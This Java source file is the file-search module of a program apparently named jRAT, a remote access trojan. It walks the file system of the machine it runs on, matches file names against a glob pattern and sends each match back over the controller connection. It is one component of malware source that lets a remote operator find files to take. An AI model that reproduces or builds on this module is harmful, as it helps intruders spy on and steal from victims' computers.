package jrat.module.fs;

import jrat.client.Connection;
import jrat.common.listeners.ConnectionListener;
import jrat.module.fs.packets.Packet37SearchResult;

import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;

public class FileSearch extends Thread implements FileVisitor<Path>, ConnectionListener {

    /**
     * If we have a startSearch running.
     * We only allow one instance at at time.
     */
	private static boolean running;

	private Connection con;
	private String searchRoot;
    private PathMatcher matcher;

	public FileSearch(Connection con, String searchRoot, String pattern, boolean dir) {
		this.con = con;
		this.searchRoot = searchRoot;

		matcher = FileSystems.getDefault().getPathMatcher("glob:" + pattern);
	}

	public void run() {
		running = true;
		con.addConnectionListener(this);

		try {
			startSearch();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	private void startSearch() throws Exception {
		Path path = FileSystems.getDefault().getPath(searchRoot);

		Files.walkFileTree(path, this);
	}

	/**
	 * Will quickly halt searching in case of interrupted connection etc
	 */
	public static void stopSearch() {
		running = false;
	}

	public FileVisitResult visitFile(Path path, BasicFileAttributes attributes) {
		String parent = path.toFile().getParent();
		String name = path.toFile().getName();
		boolean dir = path.toFile().isDirectory();

		if (matcher.matches(path.getFileName())) {
			con.addToSendQueue(new Packet37SearchResult(parent, name, dir));
		}

		return FileVisitResult.CONTINUE;
	}

    /**
     * Terminates the directory traversal
     */
	public FileVisitResult preVisitDirectory(Path path, BasicFileAttributes attributes) {
		return running ? FileVisitResult.CONTINUE : FileVisitResult.TERMINATE;
	}

	public FileVisitResult visitFileFailed(Path path, IOException ex) {
		return FileVisitResult.CONTINUE;
	}

	public FileVisitResult postVisitDirectory(Path path, IOException ex) {
		return FileVisitResult.CONTINUE;
	}

	public void onDisconnect(Exception ex) {
	    con.removeConnectionListener(this);

	    stopSearch();
    }
}
